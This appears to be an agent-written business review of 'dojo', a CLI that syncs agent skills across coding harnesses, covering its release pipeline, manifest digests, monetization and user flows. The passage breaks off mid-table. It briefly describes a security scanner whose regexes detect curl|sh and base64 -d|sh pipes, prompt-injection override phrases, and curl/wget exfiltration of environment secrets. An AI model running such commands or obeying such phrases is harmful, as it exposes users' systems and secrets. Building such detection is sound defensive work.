# Business Review — Dojo (`jadmadi/dojo`) — 2026-11-07

## Review metadata

| Field | Value |
| --- | --- |
| Product | Dojo — Agent Skills Training Ground, Native MCP Gateway & Multi-Harness Continuity Engine |
| Repository | `https://github.com/jadmadi/dojo` (`/home/antigravity/jadmadi/dojo`) |
| Commit / branch | `9022a42` (`v1.2.0`) / `main` |
| Review date | 2026-11-07 |
| Mode | `default` (full review) |
| Focus | Full review (offer, claim-vs-capability, activation & continuity flows, distribution, trust, and monetization readiness) |
| Reviewer | Business review agent |
| Evidence cut-off | 2026-11-07 |

---

## 1. Verdict

**Recommendation:** **Fix the foundation (then Narrow to the Multi-Harness + Cloud VM Continuity wedge)**

**Confidence:** **High** — directly observed in `scripts/install.sh`, `.goreleaser.yaml`, `internal/commands/upgrade.go`, `.well-known/agent-skills/index.json`, and `internal/telemetry/firestore.go`.

**The answer in one paragraph:** `dojo` has built a genuinely differentiated technical core that competitors (`legacy-upstream/cli`, `Context7`, `Smithery`, `Glama`, `cursor.directory`) do not offer in one static binary: section-level Markdown paging (`dojo toc` / `dojo load <skill>#<section>`), bi-directional multi-harness transpilation across 7 coding harnesses (`dojo sync` / `dojo sila`), and two-way GitHub Personal Skills Registry continuity between local laptops and ephemeral cloud VMs (`dojo profile link|sync|pull`). However, `dojo` currently operates as a free Apache-2.0 open-source CLI with **zero revenue model or commercial tier** (`observed`), and its top-of-funnel distribution and self-upgrade loops have three concrete foundation breaks: (1) GitHub Releases (`v1.0.0`–`v1.2.0`) have **zero prebuilt binary assets** attached despite `README.md:16-17` promising prebuilt binary installation, forcing every user without a local Go compiler to fail on install; (2) `dojo upgrade` (`internal/commands/upgrade.go:163-164`) explicitly skips `.tar.gz` and `.zip` archives while `.goreleaser.yaml:27-32` only builds `.tar.gz` and `.zip` archives; and (3) `.well-known/agent-skills/index.json:11` ships a stale SHA-256 digest for `skills/dojo/SKILL.md` and points default catalog traffic and telemetry back to upstream `legacy-catalog.example.com` (`internal/catalog/catalog.go:35`, `internal/telemetry/firestore.go:35-43`). Fix binary distribution, manifest digest integrity, and outbound secret-scanning on `dojo profile push` first; then validate whether teams will pay for a managed private team skills registry + compliance audit gate (mirroring Context7's \$10/seat/month Pro wedge) or whether `dojo` is intentionally an open-source adoption/ecosystem play.

**Top five gaps**

| # | Gap | Severity | Evidence | Why it matters |
| --- | --- | --- | --- | --- |
| 1 | **Prebuilt binary claim fails for non-Go users & `dojo upgrade` asset format mismatch** | **Critical** | `README.md:16-17`, `scripts/install.sh:47-61`, `.goreleaser.yaml:27-32`, `internal/commands/upgrade.go:161-165` | `gh release view v1.2.0` shows `"assets": []` and no `.github/workflows/` CI exists. Users without Go fail at install (`scripts/install.sh:60`); even if `.goreleaser.yaml` ran, `upgrade.go:164` rejects `.tar.gz`/`.zip` assets. |
| 2 | **Stale SHA-256 digest in `.well-known/agent-skills/index.json` breaks RFC v0.2.0 verification** | **High** | `.well-known/agent-skills/index.json:11` vs `skills/dojo/SKILL.md` | `index.json:11` declares `sha256:5bc9c1...`, whereas `skills/dojo/SKILL.md` (`v1.2.0`) hashes to `8055c4...`. Any RFC `v0.2.0` consumer enforcing SHA-256 verification rejects Dojo's flagship skill. |
| 3 | **`dojo profile push` / `sync` lacks pre-push secret & security scanning before `git push`** | **High** | `internal/commands/profile.go:563-678`, `internal/commands/doctor.go:42-50` | Users linking a GitHub registry (`dojo profile sync`) automatically stage, commit, and push local skills/commands from `~/` (`profile.go:650-677`) without running `doctor`'s credential/prompt-injection scan or checking if the target repo is public. |
| 4 | **`dojo mcp` exposes only 6 of 19 capabilities (omits the core `sync` and `profile` continuity wedge)** | **High** | `internal/mcp/server.go:78-157` | Agents connected via MCP can call `dojo_find`, `dojo_toc`, `dojo_load`, `dojo_run`, `dojo_learn`, and `dojo_doctor`, but cannot invoke `dojo_sync` or `dojo_profile_pull`/`push`/`sync` over MCP. |
| 5 | **No commercial offer, monetization tier, or own telemetry/catalog infrastructure** | **High** | `LICENSE`, `internal/catalog/catalog.go:35`, `internal/telemetry/firestore.go:35-43` | Zero billing, team tier, or hosted registry exists (`observed`). Default catalog (`legacy-catalog.example.com`) and opt-in telemetry (`legacy-project` Firestore) still point to the upstream fork author's infrastructure. |

**What would change this verdict**

- **If `dojo` is purely a non-commercial open-source developer utility / personal ecosystem tool:** The monetization gap (`G-05`) drops from High to N/A (by design), and the verdict shifts to **Proceed** as soon as the CI release pipeline (`G-01`), `.well-known` digest check (`G-02`), and pre-push security gate (`G-03`) are fixed.
- **Strongest objection to a commercial pivot:** Developers expect CLI dotfiles and local symlink tools to be free and open source (like GNU Stow, Chezmoi, or `legacy-upstream/cli`). However, Upstash's **Context7** (`https://context7.com/plans`, accessed 2026-11-07) proves that while public repositories/skills are free, engineering teams pay **\$10/seat/month (Pro)** and **\$30/user/month (Enterprise)** for private repository indexing, teamspaces, RBAC/SSO, and prompt-injection trust scoring.

---

## 2. Scope and evidence

**Reviewed**

- **Product & architecture docs:** `README.md` (lines 1–237), `CHANGELOG.md` (lines 1–93), `BACKLOG.md` (lines 1–94), `CONTRIBUTING.md`, `_design/adr/0001-agent-skills-metadata-and-catalog-specification.md`, `_design/rfc/0002-progressive-disclosure-and-hypertext-paging-architecture.md`, `_design/spec/0001-legacy-skill-cli-specification.md`, `research/cli-reviewer-audit.md`.
- **Source packages (70 Go files across 11 packages):** `main.go`, `cmd/dojo/main.go`, `internal/commands/` (`app.go`, `profile.go`, `sync.go`, `learn.go`, `load.go`, `toc.go`, `doctor.go`, `upgrade.go`, `mcp.go`, `completion.go`, `init.go`, `list.go`, `find.go`, `run.go`), `internal/catalog/` (`catalog.go`, `sections.go`, `deps.go`, `github.go`), `internal/harness/sync.go`, `internal/profile/profile.go`, `internal/mcp/server.go`, `internal/config/config.go`, `internal/state/state.go`, `internal/telemetry/firestore.go`, `internal/runner/runner.go`, `internal/search/search.go`, `internal/version/version.go`.
- **Distribution & manifests:** `scripts/install.sh`, `.goreleaser.yaml`, `.well-known/agent-skills/index.json`, `.well-known/agent-skills/skills-manifest.schema.json`, `skills/dojo/SKILL.md`, `skills/legacy-skill/SKILL.md`.
- **Live external & competitive sources (accessed 2026-11-07):** GitHub Releases API (`gh release view v1.2.0 --repo jadmadi/dojo`), Cloudflare Agent Skills Discovery RFC (`https://github.com/cloudflare/agent-skills-discovery-rfc`), Upstash Context7 (`https://context7.com/plans`), Smithery (`https://www.smithery.ai/`, `https://smithery.ai/future`), Glama (`https://glama.ai/`), Cursor Directory (`https://cursor.directory/`), Continue Hub (`https://continue.dev/`), and Legacy CLI (`https://legacy-catalog.example.com/`).

**Not reviewed**

- **Server-side code for `legacy-catalog.example.com` and `legacy-project` Firestore rules:** Hosted in external upstream infrastructure outside this repository (`internal/catalog/catalog.go:35`, `internal/telemetry/firestore.go:35`).
- **GitHub traffic/clone analytics (`gh api repos/jadmadi/dojo/traffic/clones`):** Excluded where token scope is limited or historical usage data is not stored in repo.

**Assumptions**

| Assumption | Why it is needed | How to test it |
| --- | --- | --- |
| Target power users run 2+ coding harnesses (e.g., Antigravity + Claude Code or Cursor) or use remote cloud VMs (`agy-vm`) alongside a laptop. | The core value proposition of `dojo sync` and `dojo profile link|sync|pull` depends on multi-harness or multi-machine friction. | Survey or interview 10 active users of `agy-vm` / Claude Code / Antigravity on how many harnesses/machines they sync weekly. |
| Engineering teams with private internal skills/playbooks want governance (secret prevention, prompt-injection scanning, version pinning) before sharing across seats. | Needed if `dojo` pursues a team/commercial tier above individual Git repos. | Run a fake-door CTA or 5 engineering manager interviews offering automated CI skill auditing + private team registry. |

**Evidence ledger**

| Question or claim | Evidence | Type | What would verify it |
| --- | --- | --- | --- |
| `dojo` is an Apache-2.0 open-source static Go CLI & stdio MCP server with no commercial billing code | `LICENSE:1-202`, `README.md:4-9`, `collect-signals.mjs` scan (`0` billing signals) | **observed** | Directly verified in repo |
| One-line installer downloads prebuilt binary from GitHub Releases (`dojo_${OS}_${ARCH}.tar.gz`) | `README.md:16-17`, `scripts/install.sh:47-54` | **observed** (claim) / **contradicted** (release state) | `gh release view v1.2.0 --json assets` returns `"assets": []`; no `.github/workflows` exists |
| `dojo upgrade` self-upgrades from GitHub Release binary assets | `internal/commands/upgrade.go:158-196` | **observed** (broken path) | `upgrade.go:164` rejects `.tar.gz` and `.zip`, which are the only formats in `.goreleaser.yaml:27-32` |
| `.well-known/agent-skills/index.json` provides valid SHA-256 digests for `dojo` and `legacy-skill` skills | `.well-known/agent-skills/index.json:11,19` | **observed** (stale digest for `dojo`) | `sha256sum skills/dojo/SKILL.md` is `8055c4...`, not `5bc9c1...` |
| `dojo` supports bi-directional reconciliation across 7 harnesses (`agents`, `claude`, `cursor`, `windsurf`, `antigravity`/`gemini`, `opencode`, `sila`) | `internal/harness/sync.go:27-95`, `internal/harness/sync.go:240-360` | **observed** | Verified by unit tests in `internal/harness/sync_test.go` and live execution |
| `dojo profile link|sync|pull|push` enables two-way personal skills registry sync with GitHub | `internal/commands/profile.go:88-678`, `internal/commands/dojo_features_test.go:387-469` | **observed** | Verified by `TestProfile_PersonalRegistry_LinkSyncPull` |
| Default catalog and opt-in telemetry point to upstream `legacy-catalog.example.com` | `internal/catalog/catalog.go:35`, `internal/telemetry/firestore.go:35-43` | **observed** | Direct code inspection |
| Willingness to pay for a hosted Dojo Team Registry | No pricing or checkout surface in repo | **unknown** | Customer discovery / landing page experiment (`E-01`) |

---

## 3. Business model snapshot

| Dimension | Current evidence | Assessment |
| --- | --- | --- |
| Product / category | Static Go CLI, local package manager, cross-harness continuity engine, and `stdio` MCP server for Agent Skills (`SKILL.md`) (`README.md:7-9`). | Clear technical product in a rapidly growing category (Agent Skills & MCP tooling). |
| Economic buyer | **None defined in repo** (`observed`). Potential buyers: individual AI-native engineers (prosumer) or VP Eng / DevEx leads standardizing agent skills across teams (`inferred`). | **Gap (`G-05`)**: No buyer persona, team tier, or commercial offer exists. |
| Daily user | Software engineers and AI coding agents (Antigravity Desktop/CLI, Claude Code, Cursor, Windsurf, OpenCode, Sila) (`README.md:7`, `skills/dojo/SKILL.md:1-18`). | Strong user-level and agent-level ergonomics (`--json`, `--raw`, numeric indices, `#section` paging). |
| Job to be done | Discover relevant coding/workflow skills, load only needed `#sections` to save 70–90% context tokens, and keep personal/project skills synchronized across all local harnesses and remote cloud VMs (`agy-vm`) (`README.md:7,102-123`). | High-frequency, urgent pain—especially for Antigravity remote VM (`agy-vm`) users where local `~/.gemini/skills` do not automatically mount. |
| Status quo / alternative | Manual copy-pasting of `.cursorrules`/`SKILL.md`, custom dotfile symlink scripts, upstream `legacy-upstream/cli` (one-way catalog loader), `Context7` (library docs MCP), `Smithery` / `Glama` (MCP registries). | `dojo` beats status quo scripts and one-way loaders via bi-directional `.mdc` <-> `SKILL.md` transpilation and `dojo profile sync`. |
| Why now | Explosion of multi-harness coding (engineers switching between Antigravity, Claude Code, Cursor) + cloud sandboxed agents (`agy-vm`) that start with empty `~/.gemini/skills` directories + Cloudflare Agent Skills Discovery RFC `v0.2.0` (Jan 2026). | Strong timing tailwinds; local-to-remote VM skill continuity is an acute, immediate pain. |
| Offer | 100% free, open-source Apache-2.0 CLI + MCP server + 4 pre-configured federated catalogs (`default`, `dojo`, `legacy-skill`, `gemini-skills`) (`internal/commands/app.go:25-39`). | Generous open-source core; zero commercial packaging. |
| Revenue model | **None (\$0)** (`observed` — zero billing, sponsorship, or SaaS code). | Must explicitly choose between (A) pure OSS community utility or (B) Open-Core with paid Team Registry / Governance SaaS. |
| Pricing metric | N/A (`observed`). Competitor benchmark: Context7 charges **\$10/seat/month** (Pro) and **\$5/1M tokens** for private repo parsing (`https://context7.com/plans`, accessed 2026-11-07). | If commercialized, per-seat/month for private team registries + CI governance aligns with market norms. |
| Distribution | GitHub repo (`jadmadi/dojo`), `curl | sh` installer (`scripts/install.sh`), `go install`, and viral self-bootstrapping into global agent harnesses (`scripts/install.sh:65-67`). | Auto-bootstrapping `skills/dojo/SKILL.md` into global harnesses on install is a clever agent-led distribution loop, but broken prebuilt binaries block non-Go users. |
| Moat | Multi-harness transpilation rules (`internal/harness/sync.go`), `skills.json` manifest standard, and progressive `#section` paging. | Currently **low switching cost** (Apache-2.0 code, standard `SKILL.md` files). Defensibility requires network effects (curated/verified skill index) or team workflow lock-in (`skills.json` + CI `dojo doctor` gates). |
| Stage | **Production CLI (v1.2.0) / Pre-commercial OSS** — 70 Go files, comprehensive test suite (`11` packages), 9 releases shipped (`v1.0.0`–`v1.2.0`), zero monetization. | Mature CLI engineering; nascent distribution hygiene and unmonetized business model. |

**Business model hypothesis (five lines, labeled):**

- **Product:** A static Go CLI and native MCP server that discovers, pages (`#section`), audits, and bi-directionally synchronizes Agent Skills (`SKILL.md`) across 7 coding harnesses and remote cloud VMs (`agy-vm`) — **observed** (`README.md:7-9`, `internal/harness/sync.go`, `internal/commands/profile.go`).
- **Buyer:** Currently none (Apache-2.0 OSS); the plausible economic buyer for a commercial tier is an Engineering Manager / DevEx Lead standardizing private internal skills, rules, and security guardrails across a 10–200 developer organization — **inferred** (from `Context7` Pro/Enterprise tiers at `https://context7.com/plans` and `dojo doctor --security` in `internal/commands/doctor.go`).
- **User:** AI-assisted software engineers and their autonomous coding agents (Antigravity Desktop/CLI, Claude Code, Cursor, Windsurf, OpenCode, Sila) — **observed** (`README.md:79-90`).
- **Job:** Eliminate context bloat (by streaming `#sections` instead of full files) and eliminate skill drift across local editors and ephemeral remote VMs (`dojo profile link|sync|pull`) — **observed** (`README.md:59-123`).
- **Money:** Unmonetized (\$0 revenue mechanism in codebase); unit cost is currently \$0 (hosted on GitHub + upstream `legacy-catalog.example.com` Firebase), but commercial viability requires either a paid Team Registry/Governance cloud tier or positioning `dojo` as a strategic open-source funnel for an adjacent commercial product (e.g., Sila) — **unknown** (requires founder decision and willingness-to-pay validation).

---

## 4. Offer and pricing audit

### Offer

- **What is included (shipped and verified in `v1.2.0`):**
  - Hybrid BM25 + TF-IDF + Levenshtein search (`dojo find`, `internal/search/search.go`).
  - Progressive disclosure via Markdown TOC inspection (`dojo toc`) and `#section` streaming (`dojo load <skill>#<section>`, `internal/catalog/sections.go`).
  - Topological DAG dependency resolution with cycle detection (`--with-deps`, `internal/catalog/deps.go`).
  - Bi-directional multi-harness sync (`dojo sync` / `dojo sila`) across `.agents`, `.gemini`/`.antigravity`, `.claude`, `.cursor` (`.mdc` transpilation), `.windsurf`, `.opencode`, and `.sila` (`internal/harness/sync.go`).
  - Personal Skills Registry & GitHub continuity (`dojo profile link|unlink|sync|pull|push|export`, `internal/commands/profile.go`).
  - Static skill linter, token budget checker (`6,000` bytes single-page budget), and regex prompt-injection/shell-pipe scanner (`dojo doctor`, `internal/commands/doctor.go`).
  - Zero-dependency `stdio` MCP server (`dojo mcp`, `internal/mcp/server.go`).
  - Polyglot companion script runner (`dojo run`, `internal/runner/runner.go`).
- **What is missing or promised but unbuilt:**
  - Prebuilt release binaries (`dojo_linux_amd64.tar.gz`, `dojo_darwin_arm64.tar.gz`, `dojo_windows_amd64.zip`) are referenced in `README.md:16-17`, `scripts/install.sh:47`, and `.goreleaser.yaml:27-32`, but **no GitHub Actions workflow builds or uploads them**, and `v1.2.0` has `0` release assets.
  - Archive extraction in `dojo upgrade` (`internal/commands/upgrade.go:163-164` skips `.tar.gz`/`.zip`).
  - MCP tool exposure for `sync` and `profile` (`internal/mcp/server.go:78-157` only exposes 6 read/install tools).
- **Table stakes vs differentiators vs distractions:**
  - *Table stakes:* Skill search (`find`), install (`learn`), list/show (`list`, `show`), MCP server (`mcp`).
  - *True differentiators (the wedge):* (1) **Personal Skills Registry (`dojo profile link|sync|pull`)** solving the local-to-`agy-vm` continuity gap; (2) **Bi-directional 7-harness reconciliation (`dojo sync` / `dojo sila`)** including reverse `.mdc` transpilation; (3) **Section-level hypertext paging (`dojo toc` + `dojo load #section`)** saving 70–90% of context tokens.
  - *Distractions / inherited baggage:* Hardcoded upstream `legacy-project` Firestore telemetry (`internal/telemetry/firestore.go:35-43`) and legacy `::notation` shortcut dialect in `skills/legacy-skill/SKILL.md`.
- **Self-serve vs sales-led:** 100% self-serve CLI via GitHub (`observed`).
- **Trial/free tier and end-of-trial behavior:** Entire product is free under Apache-2.0 (`LICENSE`).
- **Enterprise path:** **Absent** (searched `internal/**`, `README.md`, `_design/**` for `SSO`, `SAML`, `OIDC`, `RBAC`, `audit log`, `SLA`, `DPA`, `SOC2` — 0 matches). Private GitHub repo access works by piggybacking on the user's `GITHUB_TOKEN`, `GH_TOKEN`, or `gh` CLI (`internal/catalog/github.go`, `internal/commands/profile.go:577-637`).

### Pricing

| Question | Evidence | Finding |
| --- | --- | --- |
| Pricing metric | Searched `internal/**`, `README.md` for `price`, `plan`, `tier`, `billing`, `stripe` | **Absent** — 100% free open-source Apache-2.0 project. |
| Entry price | `LICENSE` | \$0. |
| Limits / entitlements | `internal/commands/doctor.go:187`, `internal/telemetry/firestore.go:45-47` | Technical bounds only (`6,000`B single-page skill budget warning; `10` MiB HTTP read cap; `100` max telemetry delta). No commercial entitlements. |
| Billing implementation | `scripts/collect-signals.mjs` scan | **Absent** — no payment processor, checkout, or license key check. |
| Regional payment methods | N/A | **Absent**. |
| Upgrade / expansion path | N/A | **Absent** (CLI binary upgrade only via `dojo upgrade`). |
| Downgrade / cancellation / refund | N/A | **Absent** (`dojo forget` uninstalls skills locally). |

**Unit-economics view:**
- **Current (OSS mode):** Direct infrastructure cost to `jadmadi` is **\$0/month** (`observed`) because catalog discovery uses raw GitHub / GitHub API (authenticated via the user's own `GITHUB_TOKEN` or `gh` CLI) and default catalog/telemetry hit `legacy-catalog.example.com` / `legacy-project` Firestore.
- **If commercialized as a Managed Team Skills Registry (inferred benchmark):** Hosting static/edge `index.json` manifests and `SKILL.md` blobs on Cloudflare Workers + D1/R2 costs pennies per thousand requests, yielding >90% software gross margin at a Context7-comparable \$10/seat/month Pro tier—provided `dojo` adds LLM/AST-assisted security verification or hosted team RBAC that raw GitHub repos do not provide out of the box.

---

## 5. Claim-vs-capability audit

| Claim | Source | Implementation evidence | Status | Risk | Search scope for "Absent" |
| --- | --- | --- | --- | --- | --- |
| "Install prebuilt binary (Linux / macOS / `agy-vm`) or build with Go: `curl -fsSL https://raw.githubusercontent.com/jadmadi/dojo/main/scripts/install.sh \| sh`" | `README.md:16-17`, `scripts/install.sh:46-54` | `scripts/install.sh:47` requests `releases/latest/download/dojo_${OS}_${ARCH}.tar.gz`, but `gh release view v1.2.0 --json assets` returns `[]` and `.github/workflows` does not exist. Falls back to `go install`. | **Partial / Broken for non-Go environments** | **High** — Onboarding failure on any machine/container without `go` installed. | Checked `.github/workflows`, `.goreleaser.yaml`, and GitHub Releases API (`v1.0.0`–`v1.2.0`). |
| "`dojo upgrade` — Check GitHub Releases for a newer `dojo` binary or upgrade in place" | `README.md:57`, `internal/commands/upgrade.go:46-196` | `performSelfUpgrade` (`upgrade.go:163-164`) explicitly skips `.tar.gz` and `.zip` assets, which contradicts `.goreleaser.yaml:27-32` (`tar.gz`/`zip`). Falls back to `go install` (`upgrade.go:198`). | **Partial / Contradicted asset format** | **High** — Binary self-upgrade without `go` toolchain cannot work even if GoReleaser is run. | Inspected `internal/commands/upgrade.go:158-310` and `.goreleaser.yaml:1-40`. |
| "`dojo` implements the Cloudflare Agent Skills Discovery RFC (`v0.2.0`) (`/.well-known/agent-skills/index.json`), verifies SHA-256 content digests" | `README.md:9`, `.well-known/agent-skills/index.json:1-22` | Digest verification is implemented in `internal/catalog/catalog.go:530-565`, **but** `.well-known/agent-skills/index.json:11` in this repo has a stale SHA-256 digest (`5bc9c1...`) for `skills/dojo/SKILL.md` (actual: `8055c4...`). | **Partial (Stale repo manifest)** | **High** — Integrity check failure when external RFC `v0.2.0` clients fetch `dojo` from `.well-known`. | Computed `sha256sum skills/dojo/SKILL.md` vs `.well-known/agent-skills/index.json:11`. |
| "Inspect a skill's Table of Contents (`dojo toc`), stream individual `#sections` (`dojo load <skill>#<section>`) to save 70–90% of context tokens" | `README.md:7`, `README.md:59-75` | `internal/catalog/sections.go` (fenced-code-aware Markdown parser), `internal/commands/toc.go`, `internal/commands/load.go`. | **Verified** | Low | — |
| "Resolves transitive `dependencies` in topological order (`--with-deps`)" | `README.md:9,34,74` | `internal/catalog/deps.go` (`ResolveDependencies` with cycle detection), wired in `internal/commands/load.go` and `learn.go`. | **Verified** | Low | — |
| "Bi-directionally reconcile and project skills across Antigravity (Desktop & CLI), Claude Code, Cursor, Windsurf, OpenCode, and Sila (`dojo sila` / `dojo sync`)" | `README.md:7-8,77-100` | `internal/harness/sync.go` (`ReconcileHarnesses`, `SyncSkill`, `ConvertToCursorMDC`, `ConvertFromCursorMDC`). | **Verified** | Low | — |
| "Link a GitHub repository once as your Personal Skills Registry (`dojo profile link`) ... bi-directionally sync (`dojo profile sync`) ... pull on `agy-vm` (`dojo profile pull -g`)" | `README.md:49,102-123` | `internal/config/config.go:140-161`, `internal/commands/profile.go:88-678`, verified by `TestProfile_PersonalRegistry_LinkSyncPull` (`dojo_features_test.go:387-469`). | **Verified** | Medium — `profile push` commits/pushes without scanning for secrets first (`G-03`). | — |
| "Enable dynamic tab-completion for subcommands, flags, installed and catalog skill names, live `#<section>` slugs, and `--target` harness names" | `README.md:51,146-160` | `internal/commands/completion.go` (`RunCompletion`, `RunCompleteDynamic` for `bash`, `zsh`, `fish`, `powershell`). | **Verified** | Low | — |
| "`dojo mcp` runs a zero-dependency JSON-RPC 2.0 MCP server over `stdio`, exposing `dojo_find`, `dojo_toc`, `dojo_load`, `dojo_run`, `dojo_learn`, and `dojo_doctor`" | `README.md:52,164-181` | `internal/mcp/server.go:78-256`, `internal/commands/mcp.go`. | **Verified** (exact 6 tools match claim, though `sync`/`profile` are omitted). | Medium — MCP users cannot trigger `sync` or `profile` tools. | — |
| "`dojo doctor --skills --security` — Run frontmatter validation, token budget checks, and static prompt-injection / `curl\|sh` scans" | `README.md:53,185-193` | `internal/commands/doctor.go:42-240` checks 4 regex patterns (`curl\|sh`, `base64 -d\|sh`, prompt injection override phrases, `curl/wget` env secret exfiltration). | **Verified** (with scope caveat: 4 regexes only, not invoked during `learn` or `profile push`). | Medium — Users may over-rely on regex scan as a complete security boundary. | — |
| "`dojo` reads `~/.config/dojo/config.yaml` ... and falls back automatically to `~/.config/legacy-skill` and `~/.cache/legacy-skill`" | `README.md:197-205` | `internal/config/config.go:63-95`, `internal/catalog/cache.go`, `internal/state/state.go`. | **Verified** | Low | — |

**Highest-risk claim gaps**

1. **Prebuilt binary installation (`README.md:16-17` vs `gh release view v1.2.0`):** Promising prebuilt binaries for Linux/macOS/`agy-vm` when GitHub Releases has zero uploaded binaries causes immediate silent fallback to `go install` (which takes ~15–30s and requires Go installed) or hard failure (`scripts/install.sh:60`) on machines without Go. **Fix:** Add `.github/workflows/release.yml` running GoReleaser on tag push, and update `internal/commands/upgrade.go:161-195` to extract `.tar.gz`/`.zip` archives.
2. **`.well-known/agent-skills/index.json` SHA-256 digest (`README.md:9` vs `.well-known/agent-skills/index.json:11`):** Claiming RFC `v0.2.0` SHA-256 compliance while shipping an outdated digest for `skills/dojo/SKILL.md` in `.well-known/agent-skills/index.json` breaks strict RFC clients. **Fix:** Add a unit test or `dojo doctor` check that verifies `.well-known/agent-skills/index.json` digests match `skills/*/SKILL.md` on every test run.
3. **Security & prompt-injection protection (`README.md:53,191` vs `internal/commands/profile.go` / `learn.go`):** `dojo doctor --security` runs 4 static regexes only when manually invoked; neither `dojo learn` (pulling remote skills) nor `dojo profile push` (pushing local skills/commands to GitHub) runs `doctor` automatically to block accidental secret leaks or prompt injection.

---

## 6. Flow audit

Because `dojo` is a developer CLI, MCP server, and GitHub-backed skills continuity engine rather than a web ticket-portal SaaS, the rubric's five end-to-end journeys map directly to Dojo's five core product loops:

### 6.1 Acquisition → activation (`install.sh` → `dojo init --workspace` → first skill loaded)

| Step | Implemented? | Evidence | Friction / missing state | Business impact |
| --- | --- | --- | --- | --- |
| 1. Landing value proposition (`README.md`) | **Yes** | `README.md:7-35` | Clear Minto-style value prop, architecture table, and 5-step quickstart. | Strong developer comprehension in <10 seconds. |
| 2. One-line install (`curl \| sh`) | **Partial** | `scripts/install.sh:47-61` | Looks for `dojo_${OS}_${ARCH}.tar.gz` on GitHub Releases (`404 Not Found`), falls back to `go install`. Fails completely if `go` is not installed. | **First broken step for non-Go users**; adds 20s compile latency for Go users. |
| 3. Auto-bootstrap global `dojo` skill | **Yes** | `scripts/install.sh:65-67`, `internal/commands/learn.go:142-151` | Runs `dojo learn dojo -g -f` and `dojo sync -g` on install. | Excellent activation hook: local agents immediately gain the `dojo` skill. |
| 4. Workspace initialization (`dojo init -w`) | **Yes** | `internal/commands/init.go:46-184` | Creates `.agents/skills/`, reconciles existing harness skills, writes `skills.json`, and projects symlinks/files. | Zero-config onboarding for existing repos. |
| 5. First search & section load (`find` → `toc` → `load #section`) | **Yes** | `internal/commands/find.go`, `toc.go`, `load.go` | Supports both skill names and 1-based list indices (`dojo load 1#quick-start`). | Time-to-first-value is **~30 seconds** (estimated from CLI execution). |

- **First broken step:** Step 2 (`scripts/install.sh:51`) when `go` is absent on the target machine, because prebuilt release tarballs are not uploaded to GitHub Releases.
- **Time-to-value estimate:** ~15 seconds if `go` or prebuilt binary is present; dead-end if `go` is missing (`estimate` based on `scripts/install.sh` execution).
- **Empty/loading/error coverage:** Missing-argument errors print actionable `Did you mean` suggestions (`internal/commands/helpers.go`) and `EXAMPLES` footers (`internal/commands/list.go:175-190`).

### 6.2 Core delivery: Skill discovery, progressive paging & execution (`find` → `toc` → `load` → `run`)

| Capability | Implemented? | Evidence | Gap | Impact |
| --- | --- | --- | --- | --- |
| Federated catalog discovery (`.well-known`, GitHub trees, local) | **Yes** | `internal/catalog/catalog.go:213-395`, `github.go` | Default catalog (`legacy-catalog.example.com`) + 3 auto-registered GitHub repos (`jadmadi/dojo`, `legacy-upstream/cli`, `google-gemini/gemini-skills`). | Out-of-the-box access to community skills. |
| Hybrid search (`find`) & numbered `list` | **Yes** | `internal/search/search.go`, `internal/commands/list.go` | Scope filters (`-g`, `-w`), category filters, and `#` index numbers work across all commands. | Fast human and agent lookup. |
| Section-level hypertext paging (`toc` & `load #section`) | **Yes** | `internal/catalog/sections.go:25-145`, `internal/commands/load.go:140-260` | Ignores `#` inside fenced code blocks; extracts nested subsections; enforces 6,000B page ceiling unless `--full`. | Saves 70–90% context window tokens. |
| Transitive dependency DAG (`--with-deps`) | **Yes** | `internal/catalog/deps.go:20-115` | Detects circular dependencies and loads/installs in topological order. | Enables composable modular skills. |
| Companion script execution (`dojo run`) | **Yes** | `internal/runner/runner.go`, `internal/commands/run.go` | Executes `uv`, `python3`, `bun`, `deno`, `node`, `sh` scripts with path-containment checks (`isContained`). No sandbox isolation beyond host OS user. | Convenient agent tool execution; relies on host environment security. |

### 6.3 Multi-harness continuity flow (`learn` → edit in harness → `dojo sync` / `dojo sila`)

| Step | Implemented? | Evidence | Gap | Impact |
| --- | --- | --- | --- | --- |
| 1. Install skill to canonical `.agents/skills` | **Yes** | `internal/commands/learn.go:153-280` | Verifies path containment and symlink safety (`isSafeSkillDirectory`). | Clean canonical skill storage. |
| 2. Project to 7 harnesses (`--target all`) | **Yes** | `internal/harness/sync.go:140-238` | Uses relative symlinks for Claude/OpenCode/Sila, real directory copies for Antigravity (`.gemini/skills`), and transpiles YAML frontmatter to `.mdc` for Cursor. | Solves Antigravity symlink limitations and Cursor `.mdc` format differences automatically. |
| 3. Edit or create skill inside `.gemini/skills` or `.cursor/rules/*.mdc` | **Yes** | `internal/harness/sync.go:240-360` | `ReconcileHarnesses` compares modification times and reverse-transpiles `.mdc` back into `.agents/skills/<name>/SKILL.md`. | True bi-directional continuity; no lost edits when switching IDEs. |
| 4. Conflict resolution on simultaneous edits | **Partial** | `internal/harness/sync.go:295-320` | Uses last-write-wins (`modTime.After(canonMod)`) without a 3-way merge or backup diff warning. | Concurrent edits in two harnesses overwrite the older file silently. |

### 6.4 Personal Skills Registry & Local-to-Cloud (`agy-vm`) flow (`profile link` → `sync` → `pull`)

| Step | Implemented? | Evidence | Gap | Impact |
| --- | --- | --- | --- | --- |
| 1. Link personal registry (`dojo profile link github:owner/repo -g`) | **Yes** | `internal/commands/profile.go:88-148`, `internal/config/config.go:140-161` | Persists `profile_repo` and `profile_scope` in `~/.config/dojo/config.yaml` (or reads `DOJO_PROFILE_REPO`). | One-time setup per machine. |
| 2. Package local skills, `.mdc` rules & slash commands (`push` / `sync`) | **Yes** | `internal/commands/profile.go:680-835` | Discovers skills across workspace and `~/`, converts single-file `.claude/commands/*.md` or `.cursor/rules/*.mdc` into compliant `SKILL.md` dirs. | Bridges legacy slash commands and rules into portable Agent Skills. |
| 3. Pre-push secret & security gate | **No (Missing)** | `internal/commands/profile.go:563-678` | Does **not** run `doctor --security` or scan for hardcoded tokens/keys before committing and pushing to GitHub. | **First safety gap in flow (`G-03`)**: risk of pushing sensitive local prompts or keys to a GitHub repo. |
| 4. Remote VM pull (`dojo profile pull -g` on `agy-vm`) | **Yes** | `internal/commands/profile.go:229-395` | Pulls `skills.json` + packaged `skills/<name>/` via GitHub API/archive (`GITHUB_TOKEN` or `gh api` for private repos) and projects to `~/.gemini/skills`. | Solves the remote `agy-vm` missing-skills problem in one command. |

### 6.5 Admin, trust, security, and telemetry (`doctor`, `telemetry`, `mcp`)

| Area | Evidence | Finding |
| --- | --- | --- |
